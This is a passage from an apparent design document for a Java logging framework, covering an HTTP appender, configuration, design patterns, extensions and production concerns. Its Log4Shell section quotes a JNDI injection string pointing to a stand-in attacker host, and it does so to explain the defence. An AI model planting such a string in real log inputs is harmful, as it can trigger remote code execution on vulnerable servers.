        super(name, formatter != null ? formatter : new JsonFormatter(), filterChain);
        this.endpointUrl = endpointUrl;
        this.authToken = authToken;
        this.batchSize = batchSize;
        this.batchFlushIntervalMs = batchFlushIntervalMs;
        this.maxRetries = maxRetries;
        this.requestTimeout = requestTimeout;
        this.pendingBatch = new ArrayList<>(batchSize);
    }

    public HttpAppender(String name, String endpointUrl, String authToken) {
        this(name, endpointUrl, authToken, new JsonFormatter(), FilterChain.empty(),
                50, 2000, 3, Duration.ofSeconds(10));
    }

    @Override
    protected void doStart() {
        httpClient = HttpClient.newBuilder()
                .connectTimeout(Duration.ofSeconds(5))
                .build();

        scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "http-appender-flush-" + getName());
            t.setDaemon(true);
            return t;
        });
        scheduler.scheduleAtFixedRate(
                this::flushBatch,
                batchFlushIntervalMs,
                batchFlushIntervalMs,
                TimeUnit.MILLISECONDS
        );
    }

    @Override
    protected void doStop() throws Exception {
        if (scheduler != null) {
            scheduler.shutdown();
            scheduler.awaitTermination(10, TimeUnit.SECONDS);
        }
        flushBatch();  // drain remaining events
    }

    @Override
    protected void doAppend(LogEvent event, String formatted) {
        batchLock.lock();
        try {
            pendingBatch.add(event);
            if (pendingBatch.size() >= batchSize) {
                List<LogEvent> toFlush = new ArrayList<>(pendingBatch);
                pendingBatch.clear();
                batchLock.unlock();
                try {
                    sendWithRetry(toFlush, 0);
                } finally {
                    batchLock.lock();
                }
            }
        } finally {
            batchLock.unlock();
        }
    }

    private void flushBatch() {
        List<LogEvent> toFlush;
        batchLock.lock();
        try {
            if (pendingBatch.isEmpty()) return;
            toFlush = new ArrayList<>(pendingBatch);
            pendingBatch.clear();
        } finally {
            batchLock.unlock();
        }
        sendWithRetry(toFlush, 0);
    }

    private void sendWithRetry(List<LogEvent> events, int attempt) {
        String body = buildNdjsonPayload(events);

        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder()
                .uri(URI.create(endpointUrl))
                .timeout(requestTimeout)
                .header("Content-Type", "application/x-ndjson")
                .POST(HttpRequest.BodyPublishers.ofString(body));

        if (authToken != null && !authToken.isBlank()) {
            requestBuilder.header("Authorization", "Bearer " + authToken);
        }

        try {
            HttpResponse<String> response = httpClient.send(
                    requestBuilder.build(),
                    HttpResponse.BodyHandlers.ofString());

            if (response.statusCode() >= 500 && attempt < maxRetries) {
                long backoffMs = (long) Math.pow(2, attempt) * 200;
                Thread.sleep(backoffMs);
                sendWithRetry(events, attempt + 1);
            } else if (response.statusCode() >= 400) {
                handleError("HTTP appender received " + response.statusCode()
                        + " from " + endpointUrl + " — dropping " + events.size() + " events",
                        new RuntimeException("HTTP " + response.statusCode()));
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            handleError("HTTP appender interrupted", e);
        } catch (Exception e) {
            if (attempt < maxRetries) {
                try {
                    long backoffMs = (long) Math.pow(2, attempt) * 200;
                    Thread.sleep(backoffMs);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                }
                sendWithRetry(events, attempt + 1);
            } else {
                handleError("HTTP appender failed after " + maxRetries
                        + " retries — dropping " + events.size() + " events", e);
            }
        }
    }

    private String buildNdjsonPayload(List<LogEvent> events) {
        var sb = new StringBuilder(events.size() * 256);
        for (LogEvent event : events) {
            sb.append(formatter.format(event));
            sb.append("\n");
        }
        return sb.toString();
    }
}
```

---

### 6.14 Wiring It All Together — Configuration and Usage

```java
// com/logging/framework/LoggingConfiguration.java
package com.logging.framework;

import com.logging.framework.api.LogLevel;
import com.logging.framework.api.LoggerFactory;
import com.logging.framework.appender.AsyncAppender;
import com.logging.framework.appender.ConsoleAppender;
import com.logging.framework.appender.FileAppender;
import com.logging.framework.appender.HttpAppender;
import com.logging.framework.appender.rotation.SizeBasedRotationPolicy;
import com.logging.framework.appender.rotation.TimeBasedRotationPolicy;
import com.logging.framework.core.Logger;
import com.logging.framework.core.LoggerRegistry;
import com.logging.framework.filter.FilterChain;
import com.logging.framework.filter.LevelFilter;
import com.logging.framework.filter.ThresholdFilter;
import com.logging.framework.formatter.JsonFormatter;
import com.logging.framework.formatter.TextFormatter;

import java.util.List;

/**
 * Programmatic configuration of the logging framework.
 *
 * In a real application, this would be driven by a configuration file
 * (logging.yaml, log4j2.xml, etc.) parsed at startup. Here we demonstrate
 * the programmatic API, which is what the parser would call internally.
 *
 * Call LoggingConfiguration.configure() once at application startup,
 * before any logger is used.
 */
public final class LoggingConfiguration {

    private LoggingConfiguration() {}

    /**
     * Production-like configuration:
     * - Root logger: INFO → Console (text) + File (JSON, with rotation)
     * - com.company.payments: DEBUG → dedicated payments.log
     * - com.company: WARN → HTTP remote appender (async-wrapped)
     */
    public static void configure() {
        LoggerRegistry registry = LoggerRegistry.getInstance();

        // ── 1. Console appender (stdout for INFO and below, stderr for WARN+) ──
        var consoleAppender = new ConsoleAppender(
                "console",
                new TextFormatter(true),
                FilterChain.of(new ThresholdFilter(LogLevel.TRACE)),
                ConsoleAppender.Target.AUTO
        );
        consoleAppender.start();

        // ── 2. File appender with size + time-based rotation ──
        var fileAppender = new FileAppender(
                "app-file",
                "/var/log/app/application.log",
                new JsonFormatter(false),
                FilterChain.empty(),
                List.of(
                        SizeBasedRotationPolicy.ofMegabytes(100),
                        TimeBasedRotationPolicy.daily()
                ),
                30  // keep 30 backup files
        );
        fileAppender.start();

        // ── 3. Root logger: INFO, writes to console + file ──
        Logger root = registry.getRootLogger();
        root.setLevel(LogLevel.INFO);
        root.addAppender(consoleAppender);
        root.addAppender(fileAppender);

        // ── 4. Payments-specific logger: DEBUG, dedicated file, non-additive ──
        var paymentsFileAppender = new FileAppender(
                "payments-file",
                "/var/log/app/payments.log",
                new JsonFormatter(false),
                FilterChain.of(LevelFilter.atLeast(LogLevel.DEBUG)),
                List.of(SizeBasedRotationPolicy.ofMegabytes(50)),
                10
        );
        paymentsFileAppender.start();

        Logger paymentsLogger = registry.getOrCreate("com.company.payments");
        paymentsLogger.setLevel(LogLevel.DEBUG);
        paymentsLogger.setAdditive(false);  // don't propagate to root
        paymentsLogger.addAppender(paymentsFileAppender);
        paymentsLogger.addAppender(consoleAppender);

        // ── 5. HTTP remote appender for WARN+ events (async-wrapped) ──
        var httpAppender = new HttpAppender(
                "remote-http",
                "https://logs.company.com/ingest",
                System.getenv("LOG_INGEST_TOKEN")
        );

        var asyncHttpAppender = new AsyncAppender(
                "async-remote-http",
                httpAppender,
                4096,
                AsyncAppender.BackPressureStrategy.DISCARD_OLDEST,
                5000
        );
        asyncHttpAppender.start();

        Logger companyLogger = registry.getOrCreate("com.company");
        companyLogger.setLevel(LogLevel.WARN);
        companyLogger.addAppender(asyncHttpAppender);
        // additive=true (default): WARN+ also goes to root appenders

        System.out.println("[LOGGING FRAMEWORK] Configuration complete.");
    }

    /**
     * Shut down all appenders gracefully. Call on application shutdown hook.
     */
    public static void shutdown() {
        // In a full implementation, the registry would track all started appenders
        // for coordinated shutdown. Here we demonstrate the concept.
        System.out.println("[LOGGING FRAMEWORK] Shutting down logging framework.");
    }
}
```

```java
// com/logging/framework/example/OrderService.java
package com.logging.framework.example;

import com.logging.framework.api.ILogger;
import com.logging.framework.api.LoggerFactory;
import com.logging.framework.mdc.MDC;

import java.util.UUID;

/**
 * Example application code demonstrating logger usage.
 * No dependency on any concrete framework class — only the ILogger interface.
 */
public final class OrderService {

    // Logger obtained once per class — cheap; LoggerRegistry returns the same instance.
    private static final ILogger log = LoggerFactory.getLogger(OrderService.class);

    public void processOrder(String orderId, String userId) {
        // Populate MDC at the service boundary — all log calls within this
        // method (and any callee) will automatically include these fields.
        MDC.put("requestId", UUID.randomUUID().toString());
        MDC.put("orderId", orderId);
        MDC.put("userId", userId);

        try {
            log.info("Processing order for user {}", userId);
            log.debug("Order details: orderId={}, userId={}", orderId, userId);

            validateOrder(orderId);
            chargePayment(orderId, userId);

            log.info("Order {} processed successfully", orderId);

        } catch (IllegalArgumentException e) {
            log.warn("Order validation failed: {}", e.getMessage());
            throw e;
        } catch (Exception e) {
            log.error("Unexpected error processing order {}", e, orderId);
            throw new RuntimeException("Order processing failed", e);
        } finally {
            // CRITICAL: always clear MDC to prevent context leaking into
            // the next request on a reused thread-pool thread.
            MDC.clear();
        }
    }

    private void validateOrder(String orderId) {
        if (orderId == null || orderId.isBlank()) {
            throw new IllegalArgumentException("orderId must not be blank");
        }
        log.trace("Order {} passed validation", orderId);
    }

    private void chargePayment(String orderId, String userId) {
        log.debug("Charging payment for order {} user {}", orderId, userId);
        // payment logic...
    }
}
```

```java
// com/logging/framework/example/Main.java
package com.logging.framework.example;

import com.logging.framework.LoggingConfiguration;
import com.logging.framework.api.ILogger;
import com.logging.framework.api.LogLevel;
import com.logging.framework.api.LoggerFactory;
import com.logging.framework.core.LoggerRegistry;
import com.logging.framework.mdc.MDC;

/**
 * Application entry point demonstrating framework bootstrap and usage.
 */
public final class Main {

    private static final ILogger log = LoggerFactory.getLogger(Main.class);

    public static void main(String[] args) {
        // 1. Configure logging at startup
        LoggingConfiguration.configure();

        // 2. Register JVM shutdown hook for graceful log drain
        Runtime.getRuntime().addShutdownHook(new Thread(LoggingConfiguration::shutdown));

        // 3. Use loggers
        log.info("Application starting up");

        // Demonstrate MDC propagation
        MDC.put("env", "production");
        MDC.put("host", "app-server-01");

        OrderService orderService = new OrderService();
        orderService.processOrder("ORD-42", "user-7");

        // Demonstrate runtime level change (no restart required)
        log.debug("This debug message will NOT appear — root is INFO");
        LoggerRegistry.getInstance().setLevel("com.logging.framework.example", LogLevel.DEBUG);
        log.debug("This debug message WILL appear — level was just changed to DEBUG");

        // Demonstrate isEnabled guard for expensive message construction
        if (log.isDebugEnabled()) {
            String expensiveData = buildExpensiveDebugString();
            log.debug("Expensive data: {}", expensiveData);
        }

        log.info("Application startup complete");
        MDC.clear();
    }

    private static String buildExpensiveDebugString() {
        // Simulate expensive computation that should only happen if DEBUG is on
        return "computed-debug-data-" + System.nanoTime();
    }
}
```

---

## 7. Design Patterns Used

### 7.1 Chain of Responsibility — FilterChain

```
LogEvent
   │
   ▼
ThresholdFilter  ──NEUTRAL──►  LevelFilter  ──NEUTRAL──►  CategoryFilter  ──ACCEPT──►  Appender
                                                                           ──DENY──►   (dropped)
```

Each filter returns ACCEPT, DENY, or NEUTRAL. The chain short-circuits on the first decisive result. Adding a new filter type requires no changes to existing filters or the chain runner.

**Why it fits**: Log filtering is naturally a pipeline of independent decisions. New filter types (e.g., rate-limiting filter, regex-content filter) can be inserted without modifying any existing class.

### 7.2 Strategy — LogFormatter

The `LogFormatter` interface lets appenders be configured with any output format at construction time. The appender has no knowledge of how formatting works — it just calls `formatter.format(event)`.

```java
// Swapping formatters at runtime:
fileAppender.setFormatter(new JsonFormatter());
// or
fileAppender.setFormatter(event -> event.level() + "|" + event.message()); // lambda!
```

**Why it fits**: Formatting is an orthogonal concern from transport. A FileAppender in test might use TextFormatter; the same class in production uses JsonFormatter for log pipeline ingestion.

### 7.3 Observer / Composite — Multiple Appenders

Each Logger maintains a list of Appenders and notifies all of them on each log event. The `additive` flag implements a composite tree: child logger appenders + parent logger appenders all receive the event (like a composite observer tree).

**Why it fits**: One log event needs to be delivered to multiple destinations simultaneously (console AND file AND remote). The logger doesn't need to know how many destinations exist or what they are.

### 7.4 Factory — LoggerFactory / LoggerRegistry

`LoggerFactory.getLogger(MyClass.class)` hides the construction and caching logic entirely. Callers never call `new Logger(...)`. The factory ensures that two calls with the same name return the same instance (identity guarantee).

**Why it fits**: Logger creation involves hierarchy wiring, parent lookup, and cache management. This complexity belongs in a factory, not at the call site.

### 7.5 Singleton — LoggerRegistry

The `LoggerRegistry` is a process-wide singleton (initialization-on-demand holder idiom). All loggers must share the same registry so that `setLevel("com.company", WARN)` affects every logger in that namespace, regardless of where in the codebase it was obtained.

**Why initialization-on-demand over double-checked locking**: The class loader guarantees thread-safe, lazy initialization of the `Holder` inner class. No `synchronized` keyword needed, and the singleton is not created until first use.

### 7.6 Decorator — AsyncAppender

`AsyncAppender` wraps any `Appender` implementation, adding asynchronous buffering without modifying the delegate class. This is the classic Decorator pattern: it implements the same interface as its delegate and adds behavior (queue + worker thread) around the wrapped object.

```java
Appender fileAppender = new FileAppender(...);
Appender asyncFile = new AsyncAppender("async-file", fileAppender);  // transparently async
```

**Why it fits**: The async concern is completely orthogonal to the writing concern. Any appender can be made async with zero changes to its implementation.

### 7.7 Template Method — AbstractAppender

`AbstractAppender.append()` defines the invariant algorithm (check running, run filters, format, call doAppend), while subclasses provide the variant behavior via `doAppend()`. This prevents subclasses from accidentally skipping filter evaluation or error handling.

---

## 8. Key Design Decisions and Trade-offs

### 8.1 Immutable LogEvent Record

**Decision**: `LogEvent` is a Java 17 record — immutable by design.

**Rationale**: Async logging requires passing events across thread boundaries. A mutable event would require defensive copying or synchronization at every hop. Immutability eliminates both concerns.

**Trade-off**: One allocation per log call (the record). This is unavoidable for correctness. Mitigation: guard expensive-level log calls with `isDebugEnabled()` to eliminate the allocation entirely when the level is disabled.

### 8.2 MDC Uses InheritableThreadLocal

**Decision**: MDC uses `InheritableThreadLocal` with a deep copy on child thread creation.

**Rationale**: In reactive/async code, work started on a request thread is often continued on a pool thread. `InheritableThreadLocal` propagates the context automatically to child threads.

**Trade-off**: Child threads get a snapshot — mutations in the child don't affect the parent (and vice versa). This is the correct semantics for request context: each thread should own its context. The limitation is that threads from a pre-existing thread pool (e.g., `ExecutorService`) do not inherit — callers must use `MDC.wrap(runnable)` explicitly.

### 8.3 CopyOnWriteArrayList for Appender List

**Decision**: The Logger's appender list uses `CopyOnWriteArrayList`.

**Rationale**: Appender list reads are on the hot path (every log call). Writes (add/remove appender) are rare operational events. COW trades write cost for zero-lock reads — a good fit for this access pattern.

**Trade-off**: Adding an appender copies the entire list. Unacceptable if appenders were added/removed frequently (they are not).

### 8.4 Bounded Queue in AsyncAppender

**Decision**: The async queue has a configurable hard capacity limit.

**Rationale**: An unbounded queue converts a transient downstream slowdown (slow disk I/O, network partition) into an unbounded memory leak. A bounded queue makes the trade-off explicit: choose between blocking the caller, dropping events, or the caller writing directly.

**Trade-off**: Under sustained high load with a slow sink, events will be dropped (with `DISCARD` strategy). This is the correct trade-off for a logging system — dropping logs is preferable to taking down the application with OOM.

### 8.5 Logger Hierarchy Wiring at Creation Time

**Decision**: Parent references are wired at `computeIfAbsent` time, not lazily on each log call.

**Rationale**: The hierarchy is stable (loggers are never renamed or re-parented). Wiring once at creation is O(depth) cost paid once. Lazy wiring would require synchronization on every dispatch.

**Trade-off**: If a parent logger is configured after a child logger is already created, the child gets the parent reference correctly (it was wired to the parent that existed at the time; if the parent didn't exist, it was also created at that time with the root as its parent). Re-configuration of the hierarchy after the fact is not supported — this matches Log4j2's behavior.

### 8.6 Error Isolation with try-catch in dispatch()

**Decision**: Each appender call is wrapped in a try-catch that routes exceptions to `System.err`.

**Rationale**: A broken appender (e.g., DB connection lost, disk full) must not prevent the application from running. The logging framework is infrastructure — it must never be the reason for application failure.

**Trade-off**: Errors in the appender are only reported to `System.err`. In a production system, this should also increment a metric (e.g., `logging.appender.errors.total`) and potentially trigger an alert.

---

## 9. Extension Points

### 9.1 Adding a New Appender (e.g., Kafka)

```java
// com/logging/framework/appender/KafkaAppender.java
package com.logging.framework.appender;

import com.logging.framework.core.LogEvent;
import com.logging.framework.filter.FilterChain;
import com.logging.framework.formatter.JsonFormatter;
import com.logging.framework.formatter.LogFormatter;

/**
 * Example extension: Kafka appender. Sends log events as Kafka messages.
 * Extend AbstractAppender — zero changes to the framework core.
 */
public final class KafkaAppender extends AbstractAppender {

    private final String bootstrapServers;
    private final String topic;
    // In production: private KafkaProducer<String, String> producer;

    public KafkaAppender(String name, String bootstrapServers, String topic,
                         LogFormatter formatter, FilterChain filterChain) {
        super(name, formatter != null ? formatter : new JsonFormatter(), filterChain);
        this.bootstrapServers = bootstrapServers;
        this.topic = topic;
    }

    @Override
    protected void doStart() {
        // Initialize KafkaProducer:
        // Properties props = new Properties();
        // props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);
        // props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class);
        // props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class);
        // props.put(ProducerConfig.ACKS_CONFIG, "1");  // leader ack, not quorum
        // props.put(ProducerConfig.RETRIES_CONFIG, 3);
        // producer = new KafkaProducer<>(props);
        System.out.println("[KafkaAppender] Connected to " + bootstrapServers + ", topic=" + topic);
    }

    @Override
    protected void doStop() {
        // producer.flush();
        // producer.close(Duration.ofSeconds(5));
    }

    @Override
    protected void doAppend(LogEvent event, String formatted) {
        String key = event.loggerName() + ":" + event.level().name();
        // ProducerRecord<String, String> record = new ProducerRecord<>(topic, key, formatted);
        // producer.send(record, (metadata, ex) -> {
        //     if (ex != null) handleError("Kafka send failed", ex);
        // });
        System.out.println("[KafkaAppender] Would send to topic=" + topic + " key=" + key);
    }
}
```

### 9.2 Adding a Custom Filter (e.g., Rate-Limiting Filter)

```java
// com/logging/framework/filter/RateLimitingFilter.java
package com.logging.framework.filter;

import com.logging.framework.core.LogEvent;

import java.time.Instant;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Prevents log flooding by rate-limiting log events per logger name.
 * Allows at most maxEventsPerWindow events per logger within windowMs.
 *
 * Implements Filter — pluggable into any FilterChain without framework changes.
 */
public final class RateLimitingFilter implements Filter {

    private final long maxEventsPerWindow;
    private final long windowMs;

    private record WindowState(AtomicLong count, long windowStartEpochMs) {}

    private final ConcurrentHashMap<String, WindowState> windowsByLogger = new ConcurrentHashMap<>();

    public RateLimitingFilter(long maxEventsPerWindow, long windowMs) {
        this.maxEventsPerWindow = maxEventsPerWindow;
        this.windowMs = windowMs;
    }

    @Override
    public FilterResult decide(LogEvent event) {
        long nowMs = Instant.now().toEpochMilli();
        String key = event.loggerName();

        WindowState state = windowsByLogger.compute(key, (k, existing) -> {
            if (existing == null || nowMs - existing.windowStartEpochMs() >= windowMs) {
                return new WindowState(new AtomicLong(0), nowMs);
            }
            return existing;
        });

        long count = state.count().incrementAndGet();
        return count <= maxEventsPerWindow ? FilterResult.NEUTRAL : FilterResult.DENY;
    }
}
```

### 9.3 Adding a Custom Formatter (e.g., GELF for Graylog)

```java
// com/logging/framework/formatter/GelfFormatter.java
package com.logging.framework.formatter;

import com.logging.framework.core.LogEvent;

import java.time.format.DateTimeFormatter;

/**
 * GELF (Graylog Extended Log Format) formatter.
 * Implements LogFormatter — zero framework changes required.
 */
public final class GelfFormatter implements LogFormatter {

    private static final String GELF_VERSION = "1.1";

    @Override
    public String format(LogEvent event) {
        double timestamp = event.timestamp().getEpochSecond()
                + event.timestamp().getNano() / 1_000_000_000.0;

        var sb = new StringBuilder(512);
        sb.append("{");
        sb.append("\"version\":\"").append(GELF_VERSION).append("\",");
        sb.append("\"host\":\"").append(getHostname()).append("\",");
        sb.append("\"short_message\":\"").append(escapeJson(event.message())).append("\",");
        sb.append("\"timestamp\":").append(timestamp).append(",");
        sb.append("\"level\":").append(toSyslogLevel(event)).append(",");
        sb.append("\"_logger\":\"").append(event.loggerName()).append("\",");
        sb.append("\"_thread\":\"").append(event.threadName()).append("\"");

        for (var entry : event.mdcContext().entrySet()) {
            sb.append(",\"_").append(entry.getKey()).append("\":\"")
              .append(escapeJson(entry.getValue())).append("\"");
        }

        if (event.throwable() != null) {
            sb.append(",\"full_message\":\"")
              .append(escapeJson(event.throwable().toString())).append("\"");
        }

        sb.append("}");
        return sb.toString();
    }

    private int toSyslogLevel(LogEvent event) {
        return switch (event.level()) {
            case FATAL -> 2;  // Critical
            case ERROR -> 3;  // Error
            case WARN  -> 4;  // Warning
            case INFO  -> 6;  // Informational
            case DEBUG -> 7;  // Debug
            case TRACE -> 7;
            case OFF   -> 7;
        };
    }

    private String getHostname() {
        try {
            return java.net.InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "unknown";
        }
    }

    private String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r");
    }
}
```

### 9.4 Composite Rotation Policy

```java
// com/logging/framework/appender/rotation/CompositeRotationPolicy.java
package com.logging.framework.appender.rotation;

import java.io.File;
import java.util.List;

/**
 * Rotates when ANY of the delegate policies signals rotation (OR semantics).
 * Can be changed to AND semantics by replacing the anyMatch with allMatch.
 */
public final class CompositeRotationPolicy implements RotationPolicy {

    private final List<RotationPolicy> policies;

    public CompositeRotationPolicy(List<RotationPolicy> policies) {
        this.policies = List.copyOf(policies);
    }

    public static CompositeRotationPolicy anyOf(RotationPolicy... policies) {
        return new CompositeRotationPolicy(List.of(policies));
    }

    @Override
    public boolean shouldRotate(File currentFile, long bytesWrittenThisSession) {
        return policies.stream()
                .anyMatch(p -> p.shouldRotate(currentFile, bytesWrittenThisSession));
    }

    @Override
    public void onRotation() {
        policies.forEach(RotationPolicy::onRotation);
    }
}
```

---

## 10. Production Considerations

### 10.1 Garbage Collection Pressure

**Problem**: Every `logger.debug(...)` call that is enabled allocates a `LogEvent` record, a formatted `String`, and a `Map` snapshot (MDC copy). At 500k log events/second, this is significant GC pressure.

**Mitigations**:
1. **Level guard pattern**: Always guard debug-level calls with `if (log.isDebugEnabled())` to avoid message formatting and object allocation for disabled levels.
2. **Object pooling for LogEvent** (advanced): Use a thread-local ring buffer of pre-allocated LogEvent arrays. Only applicable for the async path where the worker consumes events strictly after the producer. This breaks immutability and is complex — only justified at extreme throughput (> 5M events/sec).
3. **Lazy message formatting**: Store `template + args[]` in the event (like Log4j2's `ParameterizedMessage`) and format only when the appender actually writes. This defers allocation until necessary and skips it entirely for async drop scenarios.

### 10.2 Log4Shell-Style Security (CVE-2021-44228)

**The vulnerability**: Log4j 2.x performed JNDI lookups by evaluating `${jndi:ldap://attacker.com/a}` expressions embedded in log messages. This turned log calls into arbitrary code execution vectors.

**Our design**: `MessageFormatter` is a pure string substitution engine with no expression evaluation. It replaces `{}` placeholders with literal `toString()` values. There is no mechanism for dynamic lookup, expression evaluation, or classloading triggered by message content.

**Defense-in-depth**:
- Validate and sanitize log inputs at the service boundary (before the log call), not inside the logging framework.
- Never log raw user-controlled strings without sanitization.
- Use `isEnabled()` guards to evaluate message construction in application code, where context-aware sanitization can be applied.

### 10.3 Thread Pool and MDC Propagation

**Problem**: When work is submitted to a thread pool, `InheritableThreadLocal` does not propagate because pool threads are pre-created (they are not children of the submitting thread).

**Solution**: Use `MDC.wrap()` when submitting tasks:

```java
ExecutorService pool = Executors.newFixedThreadPool(4);
pool.submit(MDC.wrap(() -> {
    // This thread will have a copy of the submitter's MDC context
    orderService.processAsync(orderId);
}));
```

For Spring or frameworks using `TaskDecorator` / `ThreadPoolTaskExecutor`, register `MDC.wrap` as a task decorator so all submitted tasks inherit MDC automatically.

### 10.4 Async Appender Shutdown and Log Loss

**Risk**: If the application is killed with `SIGKILL` or crashes with OOM, events in the async queue are lost.

**Mitigation layers**:
1. Register a JVM shutdown hook that calls `stop()` on all `AsyncAppender` instances, which drains the queue before the JVM exits.
2. Set `shutdownTimeoutMs` to a value that allows the worker to finish draining (e.g., 10 seconds for a queue of 8192 events at typical flush rates).
3. For zero-loss requirements, use `BackPressureStrategy.CALLER_RUNS` — the calling thread writes directly when the queue is full or during shutdown.
4. For mission-critical audit logs, never use async — use a synchronous `FileAppender` with `ERROR`-triggered immediate flush.

### 10.5 Observability of the Logging Framework Itself

A logging framework that silently fails is worse than one that fails loudly.

**Recommendations**:
- Export appender error counts as JMX MBeans or Micrometer gauges (`logging.appender.errors.total{appender="file"}`).
- Export async queue depth (`logging.async.queue.depth{appender="async-file"}`) — a full queue is a leading indicator of downstream I/O problems.
- Export dropped event count (`logging.async.dropped.total`).
- Set up an alert: if `logging.appender.errors.total` increases by more than 10/minute, page on-call.

```java
// Sketch of MBean registration (production implementation):
public interface AsyncAppenderMBean {
    long getDroppedEventCount();
    int getQueueSize();
    int getQueueRemainingCapacity();
}

// Register:
// MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
// ObjectName name = new ObjectName("com.logging:type=AsyncAppender,name=" + appenderName);
// mbs.registerMBean(asyncAppender, name);
```

### 10.6 Configuration Hot-Reload

For production systems, level changes should not require a restart. The framework supports this because:

1. `Logger.level` is `volatile` — a write from one thread is immediately visible to all reader threads.
2. `LoggerRegistry.setLevel(name, level)` is a single volatile write — effectively instantaneous.
3. A configuration watcher can poll a config source (ZooKeeper, AWS AppConfig, a local file) and call `setLevel()` as needed.

```java
// Sketch of a config watcher:
ScheduledExecutorService watcher = Executors.newSingleThreadScheduledExecutor();
watcher.scheduleAtFixedRate(() -> {
    String levelStr = fetchFromConfigStore("logging.level.com.company.payments");
    if (levelStr != null) {
        LogLevel newLevel = LogLevel.valueOf(levelStr.toUpperCase());
        LoggerRegistry.getInstance().setLevel("com.company.payments", newLevel);
    }
}, 0, 30, TimeUnit.SECONDS);
```

### 10.7 Performance Benchmarks (Design Targets)

| Scenario | Target Throughput | Notes |
|---|---|---|
| Disabled level (isEnabled=false) | > 500M checks/sec | Volatile read only |
| Console appender (sync) | > 500K events/sec | PrintStream.println bottleneck |
| File appender (buffered, no flush) | > 1M events/sec | BufferedWriter 64KB buffer |
| File appender (flush on ERROR) | > 100K ERROR events/sec | fsync latency dominated |
| AsyncAppender (enqueue only) | > 5M events/sec | CAS on queue tail |
| AsyncAppender (end-to-end, file) | > 1M events/sec | Worker thread throughput |

These targets are achievable on commodity hardware (4-core, NVMe SSD). The async path is primarily bounded by the worker thread's format-and-write throughput, not the enqueue cost.

---

## Summary

This logging framework demonstrates how a small set of well-chosen design patterns — **Chain of Responsibility**, **Strategy**, **Observer**, **Factory**, **Singleton**, **Decorator**, and **Template Method** — compose cleanly to produce a system that is:

- **Extensible**: New appenders, formatters, and filters require zero changes to the framework core.
- **Performant**: Disabled-level checks are near-zero cost; async path decouples I/O from callers.
- **Thread-safe**: Every component is safe for concurrent use without global locks on the hot path.
- **Observable**: The framework surfaces its own health through error counters and queue metrics.
- **Secure**: No expression evaluation in message formatting eliminates Log4Shell-class vulnerabilities.

The key insight is that logging is not a monolithic concern — it decomposes into independent layers (filtering, formatting, transport, async buffering) that each have a single responsibility and communicate through narrow interfaces.
